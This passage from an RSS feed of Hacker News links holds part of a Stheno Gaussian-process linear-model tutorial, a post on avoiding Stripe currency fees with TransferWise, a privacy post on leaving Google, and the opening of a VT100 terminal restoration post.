See the <a href="https://www.cs.toronto.edu/~duvenaud/cookbook/">kernel cookbook</a> for an overview of commonly used kernels and the <a href="https://wesselb.github.io/stheno/docs/_build/html/readme.html#available-kernels">documentation of Stheno</a> for the corresponding classes.
For constant functions, you can set the kernel to simply a constant, for example <code>1</code>, which then models the constant function with a value drawn from \(\mathcal{N}(0, 1)\). (By default, in Stheno, all means are zero; but, if you like, <a href="https://wesselb.github.io/stheno/docs/_build/html/readme.html#available-means">you can also set a mean</a>.)</p>

<p>Let’s start out by creating a Gaussian process for the random constant function \(a(x)\) that models the slope.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>from</span> <span>stheno</span> <span>import</span> <span>GP</span>

<span>&gt;&gt;&gt;</span> <span>a</span> <span>=</span> <span>GP</span><span>(</span><span>1</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>a</span>
<span>GP</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span>
</code></pre></div></div>

<p>You can see how the Gaussian process looks by simply sampling from it.
To sample from the Gaussian process <code>a</code> at some inputs <code>x</code>, evaluate it at those inputs, <code>a(x)</code>, and call the method <code>sample</code>: <code>a(x).sample()</code>.
This shows that you can really think of a Gaussian process just like you think of a function:
pass it some inputs to get (the model for) the corresponding outputs.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>x</span> <span>=</span> <span>np</span><span>.</span><span>linspace</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>,</span> <span>100</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>plt</span><span>.</span><span>plot</span><span>(</span><span>x</span><span>,</span> <span>a</span><span>(</span><span>x</span><span>).</span><span>sample</span><span>(</span><span>20</span><span>));</span> <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div></div>

<p><img src="https://invenia.github.io/blog/public/images/linear-models-constant-functions.png" alt="Samples of a Gaussian process that models a constant function">
Figure 1: Samples of a Gaussian process that models a constant function.</p>

<p>We’ve sampled a bunch of constant functions.
Sweet!
The next step in the model \eqref{eq:ax_b_functional} is to multiply the slope function \(a(x)\) by \(x\).
To multiply <code>a</code> by \(x\), we multiply <code>a</code> by the function <code>lambda x: x</code>, which casts also \(x\) as a function:</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>f</span> <span>=</span> <span>a</span> <span>*</span> <span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>f</span>
<span>GP</span><span>(</span><span>0</span><span>,</span> <span>&lt;</span><span>lambda</span><span>&gt;</span><span>)</span>
</code></pre></div></div>

<p>This will give rise to functions like \(x \mapsto 0.1x\) and \(x \mapsto -0.4x\), depending on the value that \(a(x)\) takes.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>plt</span><span>.</span><span>plot</span><span>(</span><span>x</span><span>,</span> <span>f</span><span>(</span><span>x</span><span>).</span><span>sample</span><span>(</span><span>20</span><span>));</span> <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div></div>

<p><img src="https://invenia.github.io/blog/public/images/linear-models-slope-functions.png" alt="Samples of a Gaussian process that models functions with a random slope">
Figure 2: Samples of a Gaussian process that models functions with a random slope.</p>

<p>This is starting to look good!
The only ingredient that is missing is an offset.
We model the offset just like the slope, but here we set the kernel to <code>10</code> instead of <code>1</code>, which models the offset with a value drawn from \(\mathcal{N}(0, 10)\).</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>b</span> <span>=</span> <span>GP</span><span>(</span><span>10</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>f</span> <span>=</span> <span>a</span> <span>*</span> <span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span><span>)</span> <span>+</span> <span>b</span>
<span>AssertionError</span><span>:</span> <span>Processes</span> <span>GP</span><span>(</span><span>0</span><span>,</span> <span>&lt;</span><span>lambda</span><span>&gt;</span><span>)</span> <span>and</span> <span>GP</span><span>(</span><span>0</span><span>,</span> <span>10</span> <span>*</span> <span>1</span><span>)</span> <span>are</span> <span>associated</span> <span>to</span> <span>different</span> <span>measures</span><span>.</span>
</code></pre></div></div>

<p>Something went wrong.
Stheno has an abstraction called <em>measures</em>, where only <code>GP</code>s that are part of the same measure can be combined into new <code>GP</code>s;
the abstraction of measures is there to keep things safe and tidy.
What goes wrong here is that <code>a</code> and <code>b</code> are not part of the same measure.
Let’s explicitly create a new measure and attach <code>a</code> and <code>b</code> to it.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>from</span> <span>stheno</span> <span>import</span> <span>Measure</span>

<span>&gt;&gt;&gt;</span> <span>prior</span> <span>=</span> <span>Measure</span><span>()</span>

<span>&gt;&gt;&gt;</span> <span>a</span> <span>=</span> <span>GP</span><span>(</span><span>1</span><span>,</span> <span>measure</span><span>=</span><span>prior</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>b</span> <span>=</span> <span>GP</span><span>(</span><span>10</span><span>,</span> <span>measure</span><span>=</span><span>prior</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>f</span> <span>=</span> <span>a</span> <span>*</span> <span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span><span>)</span> <span>+</span> <span>b</span>

<span>&gt;&gt;&gt;</span> <span>f</span>
<span>GP</span><span>(</span><span>0</span><span>,</span> <span>&lt;</span><span>lambda</span><span>&gt;</span> <span>+</span> <span>10</span> <span>*</span> <span>1</span><span>)</span>
</code></pre></div></div>

<p>Let’s see how samples from <code>f</code> look like.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>plt</span><span>.</span><span>plot</span><span>(</span><span>x</span><span>,</span> <span>f</span><span>(</span><span>x</span><span>).</span><span>sample</span><span>(</span><span>20</span><span>));</span> <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div></div>

<p><img src="https://invenia.github.io/blog/public/images/linear-models-linear-functions.png" alt="Samples of a Gaussian process that models linear functions">
Figure 3: Samples of a Gaussian process that models linear functions.</p>

<p>Perfect!
We will use <code>f</code> as our linear model.</p>

<p>In practice, observations are corrupted with noise.
We can add some noise to the lines in Figure 3 by adding a Gaussian process that models noise.
You can construct such a Gaussian process by using the kernel <code>Delta()</code>, which models the noise with independent \(\mathcal{N}(0, 1)\) variables.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>from</span> <span>stheno</span> <span>import</span> <span>Delta</span>

<span>&gt;&gt;&gt;</span> <span>noise</span> <span>=</span> <span>GP</span><span>(</span><span>Delta</span><span>(),</span> <span>measure</span><span>=</span><span>prior</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>y</span> <span>=</span> <span>f</span> <span>+</span> <span>noise</span>

<span>&gt;&gt;&gt;</span> <span>y</span>
<span>GP</span><span>(</span><span>0</span><span>,</span> <span>&lt;</span><span>lambda</span><span>&gt;</span> <span>+</span> <span>10</span> <span>*</span> <span>1</span> <span>+</span> <span>Delta</span><span>())</span>

<span>&gt;&gt;&gt;</span> <span>plt</span><span>.</span><span>plot</span><span>(</span><span>x</span><span>,</span> <span>y</span><span>(</span><span>x</span><span>).</span><span>sample</span><span>(</span><span>20</span><span>));</span> <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div></div>

<p><img src="https://invenia.github.io/blog/public/images/linear-models-noisy-linear-functions.png" alt="Samples of a Gaussian process that models noisy linear functions">
Figure 4: Samples of a Gaussian process that models noisy linear functions.</p>

<p>That looks more realistic, but perhaps that’s a bit too much noise.
We can tune down the amount of noise, for example, by scaling <code>noise</code> by <code>0.5</code>.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>y</span> <span>=</span> <span>f</span> <span>+</span> <span>0.5</span> <span>*</span> <span>noise</span>

<span>&gt;&gt;&gt;</span> <span>y</span>
<span>GP</span><span>(</span><span>0</span><span>,</span> <span>&lt;</span><span>lambda</span><span>&gt;</span> <span>+</span> <span>10</span> <span>*</span> <span>1</span> <span>+</span> <span>0.25</span> <span>*</span> <span>Delta</span><span>())</span>

<span>&gt;&gt;&gt;</span> <span>plt</span><span>.</span><span>plot</span><span>(</span><span>x</span><span>,</span> <span>y</span><span>(</span><span>x</span><span>).</span><span>sample</span><span>(</span><span>20</span><span>));</span> <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div></div>

<p><img src="https://invenia.github.io/blog/public/images/linear-models-noisy-linear-functions-2.png" alt="Samples of a Gaussian process that models noisy linear functions">
Figure 5: Samples of a Gaussian process that models noisy linear functions.</p>

<p>Much better.</p>

<p>To summarise, our linear model is given by</p>

<div><div><pre><code><span>prior</span> <span>=</span> <span>Measure</span><span>()</span>

<span>a</span> <span>=</span> <span>GP</span><span>(</span><span>1</span><span>,</span> <span>measure</span><span>=</span><span>prior</span><span>)</span>            <span># Model for slope
</span><span>b</span> <span>=</span> <span>GP</span><span>(</span><span>10</span><span>,</span> <span>measure</span><span>=</span><span>prior</span><span>)</span>           <span># Model for offset
</span><span>f</span> <span>=</span> <span>a</span> <span>*</span> <span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span><span>)</span> <span>+</span> <span>b</span>           <span># Noiseless linear model
</span>
<span>noise</span> <span>=</span> <span>GP</span><span>(</span><span>Delta</span><span>(),</span> <span>measure</span><span>=</span><span>prior</span><span>)</span>  <span># Model for noise
</span><span>y</span> <span>=</span> <span>f</span> <span>+</span> <span>0.5</span> <span>*</span> <span>noise</span>                 <span># Noisy linear model
</span></code></pre></div></div>

<p>We call a program like this a <em>Gaussian process probabilistic program</em> (GPPP).
Let’s generate some noisy synthetic data, <code>(x_obs, y_obs)</code>, that will make up an example data set \((x_i, y_i)_{i=1}^n\).
We also save the observations without noise added—<code>f_obs</code>—so we can later check how good our predictions really are.</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>x_obs</span> <span>=</span> <span>np</span><span>.</span><span>linspace</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>,</span> <span>50_000</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>f_obs</span> <span>=</span> <span>0.8</span> <span>*</span> <span>x_obs</span> <span>-</span> <span>2.5</span>

<span>&gt;&gt;&gt;</span> <span>y_obs</span> <span>=</span> <span>f_obs</span> <span>+</span> <span>0.5</span> <span>*</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>randn</span><span>(</span><span>50_000</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>plt</span><span>.</span><span>scatter</span><span>(</span><span>x_obs</span><span>,</span> <span>y_obs</span><span>);</span> <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div></div>

<p><img src="https://invenia.github.io/blog/public/images/linear-models-observations.png" alt="Some observations">
Figure 6: Some observations.</p>

<p>We will see next how we can fit our model to this data.</p>

<h2 id="inference-in-linear-models">Inference in Linear Models</h2>

<p>Suppose that we wish to remove the noise from the observations in Figure 6.
We carefully phrase this problem in terms of our GPPP:
the observations <code>y_obs</code> are realisations of the <em>noisy</em> linear model <code>y</code> at <code>x_obs</code>—realisations of <code>y(x_obs)</code>—and we wish to make predictions for the <em>noiseless</em> linear model <code>f</code> at <code>x_obs</code>—predictions for <code>f(x_obs)</code>.</p>

<p>In Stheno, we can make predictions based on observations by <em>conditioning</em> the measure of the model on the observations.
In our GPPP, the measure is given by <code>prior</code>, so we aim to condition <code>prior</code> on the observations <code>y_obs</code> for <code>y(x_obs)</code>.
Mathematically, this process of incorporating information by conditioning happens through <a href="https://en.wikipedia.org/wiki/Bayes%27_theorem">Bayes’ rule</a>.
Programmatically, we first make an <code>Observations</code> object, which represents the information—the observations—that we want to incorporate, and then condition <code>prior</code> on this object:</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>from</span> <span>stheno</span> <span>import</span> <span>Observations</span>

<span>&gt;&gt;&gt;</span> <span>obs</span> <span>=</span> <span>Observations</span><span>(</span><span>y</span><span>(</span><span>x_obs</span><span>),</span> <span>y_obs</span><span>)</span>

<span>&gt;&gt;&gt;</span> <span>post</span> <span>=</span> <span>prior</span><span>.</span><span>condition</span><span>(</span><span>obs</span><span>)</span>
</code></pre></div></div>

<p>You can also more concisely perform these two steps at once, as follows:</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>post</span> <span>=</span> <span>prior</span> <span>|</span> <span>(</span><span>y</span><span>(</span><span>x_obs</span><span>),</span> <span>y_obs</span><span>)</span>
</code></pre></div></div>

<p>This mimics the mathematical notation used for conditioning.</p>

<p>With our updated measure <code>post</code>, which is often called the <em>posterior</em> measure, we can make a prediction for <code>f(x_obs)</code> by passing <code>f(x_obs)</code> to <code>post</code>:</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pred</span> <span>=</span> <span>post</span><span>(</span><span>f</span><span>(</span><span>x_obs</span><span>))</span>

<span>&gt;&gt;&gt;</span> <span>pred</span><span>.</span><span>mean</span>
<span>&lt;</span><span>dense</span> <span>matrix</span><span>:</span> <span>shape</span><span>=</span><span>50000</span><span>x1</span><span>,</span> <span>dtype</span><span>=</span><span>float64</span>
 <span>mat</span><span>=</span><span>[[</span><span>-</span><span>2.498</span><span>]</span>
      <span>[</span><span>-</span><span>2.498</span><span>]</span>
      <span>[</span><span>-</span><span>2.498</span><span>]</span>
      <span>...</span>
      <span>[</span> <span>5.501</span><span>]</span>
      <span>[</span> <span>5.502</span><span>]</span>
      <span>[</span> <span>5.502</span><span>]]</span><span>&gt;</span>

<span>&gt;&gt;&gt;</span> <span>pred</span><span>.</span><span>var</span>
<span>&lt;</span><span>low</span><span>-</span><span>rank</span> <span>matrix</span><span>:</span> <span>shape</span><span>=</span><span>50000</span><span>x50000</span><span>,</span> <span>dtype</span><span>=</span><span>float64</span><span>,</span> <span>rank</span><span>=</span><span>2</span>
 <span>left</span><span>=</span><span>[[</span><span>1.e+00</span> <span>0.e+00</span><span>]</span>
       <span>[</span><span>1.e+00</span> <span>2.e-04</span><span>]</span>
       <span>[</span><span>1.e+00</span> <span>4.e-04</span><span>]</span>
       <span>...</span>
       <span>[</span><span>1.e+00</span> <span>1.e+01</span><span>]</span>
       <span>[</span><span>1.e+00</span> <span>1.e+01</span><span>]</span>
       <span>[</span><span>1.e+00</span> <span>1.e+01</span><span>]]</span>
 <span>middle</span><span>=</span><span>[[</span> <span>2.001e-05</span> <span>-</span><span>2.995e-06</span><span>]</span>
         <span>[</span><span>-</span><span>2.997e-06</span>  <span>6.011e-07</span><span>]]</span>
 <span>right</span><span>=</span><span>[[</span><span>1.e+00</span> <span>0.e+00</span><span>]</span>
        <span>[</span><span>1.e+00</span> <span>2.e-04</span><span>]</span>
        <span>[</span><span>1.e+00</span> <span>4.e-04</span><span>]</span>
        <span>...</span>
        <span>[</span><span>1.e+00</span> <span>1.e+01</span><span>]</span>
        <span>[</span><span>1.e+00</span> <span>1.e+01</span><span>]</span>
        <span>[</span><span>1.e+00</span> <span>1.e+01</span><span>]]</span><span>&gt;</span>
</code></pre></div></div>

<p>The prediction <code>pred</code> is a <a href="https://en.wikipedia.org/wiki/Multivariate_Gaussian_distribution">multivariate Gaussian distribution</a> with a particular mean and variance, which …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://invenia.github.io/blog/2021/01/19/linear-models-with-stheno-and-jax/">https://invenia.github.io/blog/2021/01/19/linear-models-with-stheno-and-jax/</a></em></p>]]>
            </description>
            <link>https://invenia.github.io/blog/2021/01/19/linear-models-with-stheno-and-jax/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25832657</guid>
            <pubDate>Tue, 19 Jan 2021 12:10:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoid Stripe currency conversion fees using TransferWise]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25832618">thread link</a>) | @sleepyhead
<br/>
January 19, 2021 | https://blog.makeplans.net/2021/01/19/avoid-stripe-currency-conversion-fees-using-transferwise.html | <a href="https://web.archive.org/web/*/https://blog.makeplans.net/2021/01/19/avoid-stripe-currency-conversion-fees-using-transferwise.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	 <p>Like most SaaS-providers we charge in USD even though we are not based in USA. MakePlans is based in Norway and NOK is the currency of choice here (along with Brent crude oil of course). While we do have some expenses in USD most of our revenue would eventually end up in our Norwegian bank account in NOK. When using Stripe for card payments they will handle currency conversion when they pay out in your local currency. While doing this they charge a <a href="https://stripe.com/pricing">2% currency conversion fee</a>. That is on top of their already high fees (2,9% for foreign cards here in Norway!).</p>

<h2 id="unavailable-options">Unavailable options</h2>

<p>Turns out avoiding Stripe currency conversion fees wasn’t that easy. Here are the options we investigated:</p>

<h3 id="use-a-local-usd-account">Use a local USD account</h3>

<p>From the start we assumed this could easily be solved by having a local USD account. Most bigger banks offer USD accounts and we could easily open one. There would be some incoming transfer fees payable to the bank but a lot less than the 2% Stripe charges.</p>

<p><em>But Stripe only supports USD payouts to bank accounts in USA and Canada.</em> So while we did some research here it was pointless as such an account could not be used for payouts from Stripe.</p>

<h3 id="open-a-bank-account-in-the-usa-with-a-local-bank">Open a bank account in the USA with a local bank</h3>

<p>Our next research mission was to open a bank account in the USA. The easiest would be using a local bank but going into the process we were informed that it was not allowed to open what they call a personal account. Even though this would be a business account this rule comes into action when the business is majority owned by one person. As is the case with MakePlans. And that person would not sell of half of the company just to get a bank account in USA.</p>

<h3 id="open-a-bank-account-in-the-usa-with-an-american-bank">Open a bank account in the USA with an American bank</h3>

<p>So as a European company this leaves us one option: open a bank account in USA. While starting a US company is a lot more complicated than starting a company here in Norway (can be done in less than 30 minutes including getting a bank account) there are options for opening up a company fairly smoothly. And no reason to follow all the Google search results - Stripe actually offers a way to this. It is called <a href="https://stripe.com/atlas">Stripe Atlas</a>. If you need a US company for other reason this seems like a good way to go. But it will mean that have all the obligations that comes with having another company and it being in USA. It will also complicate tax reporting in your company structure. So while some research was conducted here we quickly dismissed this idea and I don’t recommend it unless you need a US company for other reasons.</p>

<h2 id="enter-transferwise">Enter TransferWise</h2>

<p>I have used <a href="https://transferwise.com/">TransferWise</a> a few times and it seems like a good option for money transfer and while I knew about their card offering I never really looked into too much as I was using Revolut when travelling to save on currency conversion fees for private usage. I guess it was around the time when Revolut launched their business offering I started looking into TransferWise Business. It got me excited but <a href="https://www.revolut.com/business">Revolut Business</a> only offers a USD account in the UK, and as you already know now Stripe only supports payout in USD to accounts located in USA and Canada. TransferWise however do offer a USD account in USA. You will get a fully functional business bank account with routing and account number. Yay!</p>

<h2 id="how-to-set-it-up">How to set it up</h2>

<p>Getting instant 2% profit is quick and easy:</p>

<ol>
  <li>
    <p><a href="https://transferwise.com/invite/i/espena8">Register for a TransferWise business account</a>.</p>
  </li>
  <li>
    <p><a href="https://transferwise.com/flows/open-balance#/">Open a USD balance in TransferWise</a>.</p>
  </li>
  <li>
    <p>Enter the TransferWise USD bank account details in the <a href="https://dashboard.stripe.com/settings/payouts">Stripe dashboard ‘Payout settings’ section</a>.</p>
  </li>
</ol>

<p>From now on all your USD charges will be paid out in USD and you will no longer pay any currency conversion fees to Stripe.</p>

<p>As a bonus you can use your shiny new TransferWise card and pay your expenses such as Heroku or Amazon directly in USD. Saving you even more in currency conversion fees as your local card usually will charge 2% as well. Double win!</p>

<h2 id="how-much-does-it-cost">How much does it cost?</h2>

<ul>
  <li>Free to open account.</li>
  <li>Free debit Mastercard.</li>
</ul>

<p>Transfer of $1000 USD to Norwegian bank account by converting to NOK:</p>

<table>
  <thead>
    <tr>
      <th><strong>Method</strong></th>
      <th><strong>Variable fee</strong></th>
      <th><strong>Fixed Fees</strong></th>
      <th><strong>Total Fees</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Stripe</td>
      <td>2.00%</td>
      <td>Free</td>
      <td>$20 USD</td>
    </tr>
    <tr>
      <td>TransferWise</td>
      <td>0.44%</td>
      <td>$0.80 USD</td>
      <td>$5.18 USD</td>
    </tr>
  </tbody>
</table>

<p>If you do not need to transfer to your local bank account you can spend using your TransferWise card. Fees for $1000 USD spending:</p>

<table>
  <thead>
    <tr>
      <th><strong>Currency</strong></th>
      <th><strong>Variable fee</strong></th>
      <th><strong>Total Fees</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>USD</td>
      <td>Free</td>
      <td>Free</td>
    </tr>
    <tr>
      <td>NOK</td>
      <td>0.44%</td>
      <td>$4.38 USD</td>
    </tr>
  </tbody>
</table>

<p>For other currencies and amounts see the <a href="https://transferwise.com/gb/pricing/borderless-send">pricing calculator</a> and <a href="https://transferwise.com/gb/multi-currency-account/pricing">full price list</a> for TransferWise multi-currency account.</p>

<p>To get started with <a href="https://transferwise.com/invite/i/espena8">TransferWise you can register here</a> - this link will also give you fee-free transfer of up to 500 GBP.</p>

	</div></div>]]>
            </description>
            <link>https://blog.makeplans.net/2021/01/19/avoid-stripe-currency-conversion-fees-using-transferwise.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25832618</guid>
            <pubDate>Tue, 19 Jan 2021 12:05:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to leave Google and why]]>
            </title>
            <description>
<![CDATA[
Score 230 | Comments 137 (<a href="https://news.ycombinator.com/item?id=25831981">thread link</a>) | @yaszko
<br/>
January 19, 2021 | https://jach.me/how-to-leave-google | <a href="https://web.archive.org/web/*/https://jach.me/how-to-leave-google">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>
          You should already know how big tech companies like
          <i>Google</i> or <i>Facebook</i> are using your private data to make
          revenue from targeted ads (and sometimes maybe
          <a href="https://www.bbc.co.uk/news/technology-46618582">sell it under the hood</a>
          without your knowledge). There is no secret about
          <a href="https://www.economist.com/leaders/2017/05/06/the-worlds-most-valuable-resource-is-no-longer-oil-but-data">data being the most valuable asset on earth now</a>
          - even exceeding the oil.
        </p>
        
        <p>
          Some people say "I have nothing to hide, I don't care" which is
          essentialy ignoring basic human right and making this right worthless
          to you and very precious to others. We are already living in
          <i>Cyberpunk</i> era and the world is starting to be led by big
          organizations rather than governments so let's try to prepare
          ourselves and start to care about our data.
        </p>
        <p>
          I think <i>Google</i> and <i>Facebook</i> are particulary bad when it
          comes to the data - we all heard about <i>Cambridge Analytica</i> and
          lately about <i>Whatsapp scandal</i>. Removing <i>Facebook</i> account
          is slightly easier than moving away from your <i>Google</i> account.
          It's impossible to just toggle some settings and let go your gmail
          address, google search, photos, youtube - pretty much your entire
          digital life.
        </p>
        <p>
          Recently <i>Google</i> changed their policy for storing photos.
          Starting from July 2021 you won't have unlimited High Quality storage
          as before rather than 15GB limit. This is still okay in terms of space
          but the politics behind it is just disgusting. <i>Google</i> was
          effectively feeding it's photo AI algorithms for face detection and
          tagging for years now using user data obtained by giving up the
          service for free. Now when these algorithms got so good and it's
          almost impossible to make them better and <i>Google</i> don't need
          users anymore they switched to make some money from the service.
        </p>
        
        <p>
          To download and backup all your data it's best to use
          <a href="https://takeout.google.com/"><i>Google Takeout</i></a>.
        </p>
        <p>
          Follow the intructions and soon you'll get an email with links to your
          data. After you safely obtain it, start clearing your
          <i>Google</i> account.
        </p>

        
        <ol>
          <li>
            <i>Google Photos</i>
            <p>
              To remove all photos and videos you need to go to
              <a href="https://photos.google.com/">photos.google.com</a> and
              remove them from there. This might not be as quick as clicking a
              button.
            </p>
          </li>
          <li>
            <i>Youtube, Gmail, Google One</i>
            <p>
              Go to
              <a href="https://myaccount.google.com/delete-services-or-account">Delete services or account</a>
              page and choose what services to remove.
            </p>
          </li>
          <li>
            <i>Google Meet &amp; Calendar</i>
            <p>
              Hard one. People often invite you for online meetings using both
              services. You can't force them to not use those but you can always
              use private browser mode.
            </p>
          </li>
          <li>
            <i>Google Search</i>
            <p>
              Hardest one. Google's core product and definetely the best one on
              the market. You can switch to
              <a href="https://duckduckgo.com/">Duck Duck Go</a> which is okay
              and does the job.
            </p>
          </li>
        </ol>
        <p>
          I know it's really hard to remove <i>Youtube</i> and <i>Gmail</i> for
          example. There is no other place than <i>Youtube</i> where all my
          favourite creators are and many people already have my
          <i>Gmail</i> address and contacting me via this one. What I did is
          setup an email forwarding (yes I know Google can still track messages)
          and start using <i>Youtube</i> only via iOS App to avoid auto-logging
          in browser.
        </p>
        <p>
          If you are really hardcore about this you can always go and
          <a href="https://myaccount.google.com/deleteaccount">Delete account completely</a>
          🤫
        </p>
      </article></div>]]>
            </description>
            <link>https://jach.me/how-to-leave-google</link>
            <guid isPermaLink="false">hacker-news-small-sites-25831981</guid>
            <pubDate>Tue, 19 Jan 2021 10:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital VT100 (1978) – Beautiful Vintage Terminal]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25831695">thread link</a>) | @maxejennings
<br/>
January 19, 2021 | https://www.oldcomputr.com/digital-vt100-1978/#more-703 | <a href="https://web.archive.org/web/*/https://www.oldcomputr.com/digital-vt100-1978/#more-703">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7349.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7349.jpg" alt="Digital VT100" width="1248" height="1012" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7349.jpg 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7349-300x243.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7349-1024x830.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7349-624x506.jpg 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>I thank Daniele F. for donating this terminal. He contacted me from&nbsp;the <a href="https://www.oldcomputr.com/donate/">donation page</a>&nbsp;at the end of May but I couldn’t&nbsp;retrieve it until&nbsp;the beginning of October, when I passed through&nbsp;Verona while I was going to Brusaporto (a few kilometres from Bergamo) where I attended an annual <a href="http://www.brusaretro.it/">retrocomputing meeting</a>.</p>

<p>The terminal, after a thorough cleaning and an accurate inspection, turned on without any problems. It was just dusty and dirty.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240.jpg" alt="Digital VT100 - dirty" width="1080" height="720" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240-300x200.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240-1024x683.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240-624x416.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The first item I started to clean was the keyboard. The next picture shows it before and after the cleaning process.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241.jpg" alt="Digital VT100 - keys before / after" width="1080" height="889" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241-300x247.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241-1024x843.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241-624x514.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>I know that I’ve said it before… detaching and cleaning every single key is boring. But it is a manual and repetitive task&nbsp;that frees&nbsp;my mind, I find it quite&nbsp;relaxing, and the final result is always&nbsp;worth the time spent. Look at the next photo: beautiful, clean, shiny keys, with that mechanical feeling&nbsp;I sometimes miss on modern keyboards.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keyboard_detail-7352.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keyboard_detail-7352.jpg" alt="Digital VT100 - keyboard - clean" width="1080" height="720" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keyboard_detail-7352.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keyboard_detail-7352-300x200.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keyboard_detail-7352-1024x683.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keyboard_detail-7352-624x416.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>Here’s the keyboard board without the keys, after being cleaned:</p>
